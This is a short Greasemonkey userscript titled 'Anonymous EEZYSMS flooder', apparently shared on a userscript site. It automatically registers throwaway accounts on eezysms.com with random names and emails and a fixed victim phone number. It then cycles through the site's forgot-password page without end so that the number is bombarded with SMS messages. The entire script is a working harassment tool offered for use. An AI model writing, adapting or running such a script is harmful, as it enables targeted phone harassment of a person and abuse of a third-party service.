
// ==UserScript==
// @name          Anonymous EEZYSMS flooder
// @namespace     AMARFF
// @include       http://*eezysms.com/*
// ==/UserScript==

var victim=0;
if(document.location=="http://eezysms.com/veezy/index.php"||document.location=="http://www.eezysms.com/veezy/index.php")
{
document.getElementById('regusername').value='xzcvxzcv'+Math.floor(Math.random()*1456484);
document.getElementById('regName').value='xzcvxzcv'+Math.floor(Math.random()*1456484);
document.getElementById('regemail').value='zxcvzxcv'+Math.floor(Math.random()*1456484)+'@gmail.com';
document.getElementById('regmobilenumber').value=09214212419;
document.getElementsByName("login")[1].click();void(0);
setTimeout("document.location='http://eezysms.com/veezy/index.php?action=forgotpassword'",1000)

}


if(document.location=="http://eezysms.com/veezy/index.php?action=forgotpassword"||document.location=="http://www.eezysms.com/veezy/index.php?action=forgotpassword")
{
document.getElementById('mobile').value=09214212419;
document.getElementsByName("login")[0].click();void(0);
}

if(document.location=="http://eezysms.com/veezy/index.php?action=forgotpasswordsendsms"||document.location=="http://www.eezysms.com/veezy/index.php?action=forgotpasswordsendsms")
document.location="http://eezysms.com/veezy/index.php?action=forgotpassword";
Because it's your web | Donate

Powered by overstimulate with the help of many friends

Policy & Guidelines: DMCA Privacy Policy